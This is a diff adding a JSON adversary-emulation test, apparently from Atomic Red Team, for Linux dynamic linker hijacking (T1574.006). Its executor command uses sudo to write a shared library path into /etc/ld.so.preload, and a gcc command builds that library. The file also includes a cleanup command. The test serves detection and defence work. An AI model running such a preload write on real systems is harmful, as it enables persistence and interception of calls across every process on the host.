@@ -1,0 +1,45 @@
+{
+    "name": "Shared Library Injection via /etc/ld.so.preload",
+    "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.  Upon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload.  ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "dependency_executor_name": "bash",
+    "executor": {
+        "command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n",
+        "cleanup_command": "sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload\n",
+        "name": "bash",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1574.006",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Dynamic Linker Hijacking",
+    "source": "ART",
+    "uuid": "39cb0e67-dd0d-4b74-a74b-c072db7ae991",
+    "arguments": {
+        "path_to_shared_library_source": {
+            "description": "Path to a shared library source code",
+            "type": "path",
+            "default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"
+        },
+        "path_to_shared_library": {
+            "description": "Path to a shared library object",
+            "type": "path",
+            "default": "/tmp/T1574006.so"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
+            "prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
+            "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
